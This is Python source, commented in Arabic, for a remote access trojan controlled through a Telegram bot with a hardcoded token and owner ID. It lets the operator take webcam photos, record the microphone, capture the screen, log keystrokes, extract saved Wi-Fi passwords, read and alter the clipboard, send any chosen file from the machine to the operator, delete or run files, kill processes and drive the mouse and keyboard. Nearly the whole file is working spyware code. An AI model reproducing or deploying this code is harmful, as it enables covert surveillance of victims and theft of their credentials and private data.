import telebot
import subprocess
import os
import sys
import time
import threading
import requests
import socket
import scapy.all as scapy
from cryptography.fernet import Fernet
import json
import sqlite3
import shutil
import random
import cv2
import pyaudio
import wave
from PIL import ImageGrab
import psutil
import pyautogui
import win32api
import win32con
import win32gui
import win32process
import win32clipboard
from pynput import keyboard, mouse
import platform

# ======== إعدادات البوت (تم التحديث) ========
TOKEN = "8676298442:AAGYZS5LoQwtxG4z--j5e_e044q3qtLxvHQ"  # توكن البوت
ADMIN_ID = 8427939681  # معرف المالك

bot = telebot.TeleBot(TOKEN)
keylogger_running = False
keylog_data = ""
keylog_listener = None

# ======== دالة تنفيذ الأوامر ========
def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return result if result else "تم التنفيذ بنجاح ✅"
    except Exception as e:
        return f"خطأ: {str(e)}"

# ======== 1. التحكم بالكاميرا ========
def capture_camera():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("camera.jpg", frame)
        cam.release()
        return "camera.jpg" if ret else None
    except:
        return None

# ======== 2. تسجيل الصوت ========
def record_audio(duration=10):
    try:
        chunk = 1024
        format = pyaudio.paInt16
        channels = 1
        rate = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
        frames = []
        for _ in range(0, int(rate / chunk * duration)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open("audio.wav", 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        return "audio.wav"
    except:
        return None

# ======== 3. تصوير الشاشة ========
def screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        return "screenshot.png"
    except:
        return None

# ======== 4. التحكم بالماوس ========
def move_mouse(x, y):
    pyautogui.moveTo(x, y)
    return f"تم تحريك الماوس إلى ({x}, {y})"

def click_mouse(button='left'):
    if button == 'left':
        pyautogui.click()
    elif button == 'right':
        pyautogui.rightClick()
    elif button == 'double':
        pyautogui.doubleClick()
    return f"تم النقر بـ {button}"

# ======== 5. التحكم بلوحة المفاتيح ========
def type_text(text):
    pyautogui.typewrite(text)
    return f"تم كتابة: {text}"

def press_key(key):
    pyautogui.press(key)
    return f"تم الضغط على: {key}"

# ======== 6. إدارة العمليات ========
def list_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            processes.append(f"{proc.info['pid']} - {proc.info['name']} - CPU: {proc.info['cpu_percent']}% - MEM: {proc.info['memory_percent']}%")
        except:
            pass
    return "\n".join(processes[:50])

def kill_process(pid):
    try:
        os.kill(pid, 9)
        return f"تم إنهاء العملية {pid}"
    except:
        return f"فشل إنهاء العملية {pid}"

# ======== 7. تشغيل الملفات ========
def run_file(path):
    try:
        os.startfile(path)
        return f"تم تشغيل: {path}"
    except:
        return f"فشل تشغيل: {path}"

# ======== 8. إدارة الملفات ========
def list_files(path="."):
    try:
        files = os.listdir(path)
        result = []
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                result.append(f"📁 {f}")
            else:
                size = os.path.getsize(full_path)
                result.append(f"📄 {f} - {size} بايت")
        return "\n".join(result)
    except:
        return "خطأ في قراءة المجلد"

def delete_file(path):
    try:
        os.remove(path)
        return f"تم حذف: {path}"
    except:
        return f"فشل حذف: {path}"

def download_file(path):
    try:
        if os.path.exists(path):
            return path
        return None
    except:
        return None

def upload_file(path):
    try:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                bot.send_document(ADMIN_ID, f)
            return f"تم رفع: {path}"
        return "الملف غير موجود"
    except:
        return "فشل رفع الملف"

# ======== 9. سجل الضغطات المتقدم ========
def start_keylogger():
    global keylogger_running, keylog_data
    keylogger_running = True
    keylog_data = ""
    def on_press(key):
        global keylog_data
        if keylogger_running:
            try:
                keylog_data += str(key.char)
            except:
                keylog_data += f" [{str(key)}] "
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

# ======== 10. معلومات النظام ========
def system_info():
    info = f"""
📊 معلومات النظام:
- نظام التشغيل: {os.name}
- المعالج: {platform.processor()}
- عدد النوى: {os.cpu_count()}
- الرام: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
- الرام المستخدم: {round(psutil.virtual_memory().used / (1024**3), 2)} GB
- المساحة الكلية: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB
- المساحة المستخدمة: {round(psutil.disk_usage('/').used / (1024**3), 2)} GB
- البطارية: {psutil.sensors_battery().percent if psutil.sensors_battery() else 'غير متاحة'}%
"""
    return info

# ======== 11. شبكة الواي فاي ========
def get_wifi_passwords():
    try:
        result = run_command("netsh wlan show profiles")
        profiles = []
        for line in result.split('\n'):
            if ":" in line and "All User Profile" in line:
                profile = line.split(":")[1].strip()
                profiles.append(profile)
        passwords = []
        for profile in profiles:
            try:
                cmd = f'netsh wlan show profile name="{profile}" key=clear'
                output = run_command(cmd)
                for line in output.split('\n'):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        passwords.append(f"{profile}: {password}")
            except:
                pass
        return "\n".join(passwords) if passwords else "لا توجد شبكات محفوظة"
    except:
        return "خطأ في جلب كلمات المرور"

# ======== 12. الحافظة ========
def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data if data else "الحافظة فارغة"
    except:
        return "فشل قراءة الحافظة"

def set_clipboard(text):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        return "تم تعديل الحافظة"
    except:
        return "فشل تعديل الحافظة"

# ======== 13. النوافذ المفتوحة ========
def list_windows():
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd):
            windows.append(win32gui.GetWindowText(hwnd))
    windows = []
    win32gui.EnumWindows(callback, windows)
    return "\n".join([f"🪟 {w}" for w in windows if w])

# ======== 14. التحكم بالصوت ========
def set_volume(level):
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level/100, None)
        return f"تم ضبط الصوت على {level}%"
    except:
        return "فشل ضبط الصوت"

# ======== 15. منع النوم ========
def prevent_sleep():
    try:
        import ctypes
        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        return "تم منع النوم"
    except:
        return "فشل منع النوم"

# ======== أوامر البوت ========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ غير مصرح لك!")
        return
    bot.reply_to(message, """
👹 التحكم الشامل بالجهاز - الأوامر:

📷 الكاميرا:
/camera - تصوير الكاميرا

🎤 الصوت:
/audio <ثواني> - تسجيل الصوت

🖥️ الشاشة:
/screenshot - تصوير الشاشة

🖱️ الماوس:
/move <X> <Y> - تحريك الماوس
/click <left/right/double> - نقر

⌨️ لوحة المفاتيح:
/type <نص> - كتابة نص
/press <مفتاح> - الضغط على مفتاح

📋 العمليات:
/processes - عرض العمليات
/kill <PID> - إنهاء عملية

📁 الملفات:
/files <مسار> - عرض الملفات
/delete <مسار> - حذف ملف
/download <مسار> - تحميل ملف
/upload <مسار> - رفع ملف
/run <مسار> - تشغيل ملف

🔑 كلمات المرور:
/wifi - كلمات مرور الواي فاي

📋 الحافظة:
/clipboard - عرض الحافظة
/setclip <نص> - تعديل الحافظة

🪟 النوافذ:
/windows - عرض النوافذ المفتوحة

🔊 الصوت:
/volume <0-100> - ضبط مستوى الصوت

💤 الطاقة:
/nosleep - منع النوم

💻 معلومات:
/sysinfo - معلومات النظام

⌨️ الكيلوغر:
/keylog_start - بدء التسجيل
/keylog_stop - إيقاف التسجيل
/keylog_get - جلب السجل

👿 أنا في خدمتك!
""")

@bot.message_handler(commands=['camera'])
def handle_camera(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "📷 جاري التقاط الصورة...")
    img = capture_camera()
    if img:
        with open(img, 'rb') as f:
            bot.send_photo(message.chat.id, f)
        os.remove(img)
    else:
        bot.reply_to(message, "❌ فشل التقاط الصورة")

@bot.message_handler(commands=['audio'])
def handle_audio(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    duration = int(args[1]) if len(args) > 1 else 10
    bot.reply_to(message, f"🎤 جاري التسجيل لمدة {duration} ثانية...")
    audio = record_audio(duration)
    if audio:
        with open(audio, 'rb') as f:
            bot.send_audio(message.chat.id, f)
        os.remove(audio)
    else:
        bot.reply_to(message, "❌ فشل التسجيل")

@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "🖥️ جاري تصوير الشاشة...")
    img = screenshot()
    if img:
        with open(img, 'rb') as f:
            bot.send_photo(message.chat.id, f)
        os.remove(img)
    else:
        bot.reply_to(message, "❌ فشل التصوير")

@bot.message_handler(commands=['move'])
def handle_move(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ استخدم: /move <X> <Y>")
        return
    try:
        x, y = int(args[1]), int(args[2])
        result = move_mouse(x, y)
        bot.reply_to(message, f"✅ {result}")
    except:
        bot.reply_to(message, "❌ خطأ في الإحداثيات")

@bot.message_handler(commands=['click'])
def handle_click(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    button = args[1] if len(args) > 1 else 'left'
    result = click_mouse(button)
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['type'])
def handle_type(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /type <نص>")
        return
    result = type_text(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['press'])
def handle_press(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /press <مفتاح>")
        return
    result = press_key(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['processes'])
def handle_processes(message):
    if message.from_user.id != ADMIN_ID:
        return
    processes = list_processes()
    if len(processes) > 4000:
        with open('processes.txt', 'w') as f:
            f.write(processes)
        bot.send_document(message.chat.id, open('processes.txt', 'rb'))
        os.remove('processes.txt')
    else:
        bot.reply_to(message, f"📊 العمليات:\n{processes}")

@bot.message_handler(commands=['kill'])
def handle_kill(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /kill <PID>")
        return
    try:
        pid = int(args[1])
        result = kill_process(pid)
        bot.reply_to(message, f"✅ {result}")
    except:
        bot.reply_to(message, "❌ PID غير صالح")

@bot.message_handler(commands=['files'])
def handle_files(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    path = args[1] if len(args) > 1 else "."
    files = list_files(path)
    if len(files) > 4000:
        with open('files.txt', 'w') as f:
            f.write(files)
        bot.send_document(message.chat.id, open('files.txt', 'rb'))
        os.remove('files.txt')
    else:
        bot.reply_to(message, f"📁 الملفات:\n{files}")

@bot.message_handler(commands=['delete'])
def handle_delete(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /delete <مسار>")
        return
    result = delete_file(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['download'])
def handle_download(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /download <مسار>")
        return
    file_path = download_file(args[1])
    if file_path:
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.reply_to(message, "❌ الملف غير موجود")

@bot.message_handler(commands=['upload'])
def handle_upload(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /upload <مسار>")
        return
    result = upload_file(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['run'])
def handle_run(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /run <مسار>")
        return
    result = run_file(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['wifi'])
def handle_wifi(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "🔑 جاري جلب كلمات المرور...")
    passwords = get_wifi_passwords()
    if len(passwords) > 4000:
        with open('wifi.txt', 'w') as f:
            f.write(passwords)
        bot.send_document(message.chat.id, open('wifi.txt', 'rb'))
        os.remove('wifi.txt')
    else:
        bot.reply_to(message, f"🔑 كلمات المرور:\n{passwords}")

@bot.message_handler(commands=['clipboard'])
def handle_clipboard(message):
    if message.from_user.id != ADMIN_ID:
        return
    data = get_clipboard()
    bot.reply_to(message, f"📋 الحافظة:\n{data}")

@bot.message_handler(commands=['setclip'])
def handle_setclip(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /setclip <نص>")
        return
    result = set_clipboard(args[1])
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['windows'])
def handle_windows(message):
    if message.from_user.id != ADMIN_ID:
        return
    windows = list_windows()
    if len(windows) > 4000:
        with open('windows.txt', 'w') as f:
            f.write(windows)
        bot.send_document(message.chat.id, open('windows.txt', 'rb'))
        os.remove('windows.txt')
    else:
        bot.reply_to(message, f"🪟 النوافذ:\n{windows}")

@bot.message_handler(commands=['volume'])
def handle_volume(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ استخدم: /volume <0-100>")
        return
    try:
        level = int(args[1])
        result = set_volume(level)
        bot.reply_to(message, f"✅ {result}")
    except:
        bot.reply_to(message, "❌ قيمة غير صالحة")

@bot.message_handler(commands=['nosleep'])
def handle_nosleep(message):
    if message.from_user.id != ADMIN_ID:
        return
    result = prevent_sleep()
    bot.reply_to(message, f"✅ {result}")

@bot.message_handler(commands=['sysinfo'])
def handle_sysinfo(message):
    if message.from_user.id != ADMIN_ID:
        return
    info = system_info()
    bot.reply_to(message, f"{info}")

@bot.message_handler(commands=['keylog_start'])
def handle_keylog_start(message):
    if message.from_user.id != ADMIN_ID:
        return
    global keylog_listener
    bot.reply_to(message, "⌨️ بدء تسجيل الضغطات...")
    keylog_listener = start_keylogger()
    bot.reply_to(message, "✅ بدأ التسجيل")

@bot.message_handler(commands=['keylog_stop'])
def handle_keylog_stop(message):
    if message.from_user.id != ADMIN_ID:
        return
    global keylogger_running, keylog_listener
    keylogger_running = False
    if keylog_listener:
        keylog_listener.stop()
    bot.reply_to(message, "✅ تم إيقاف التسجيل")

@bot.message_handler(commands=['keylog_get'])
def handle_keylog_get(message):
    if message.from_user.id != ADMIN_ID:
        return
    global keylog_data
    if keylog_data:
        if len(keylog_data) > 4000:
            with open('keylog.txt', 'w') as f:
                f.write(keylog_data)
            bot.send_document(message.chat.id, open('keylog.txt', 'rb'))
            os.remove('keylog.txt')
        else:
            bot.reply_to(message, f"⌨️ السجل:\n{keylog_data}")
    else:
        bot.reply_to(message, "❌ لا توجد ضغطات مسجلة")

@bot.message_handler(commands=['exit'])
def handle_exit(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "👿 تم إيقاف البوت يا سيدي!")
    os._exit(0)

# ======== تشغيل البوت ========
print("👺 البوت يعمل... أنتظر أوامرك يا سيدي!")
print(f"✅ التوكن: {TOKEN}")
print(f"✅ معرف المالك: {ADMIN_ID}")
bot.infinity_polling()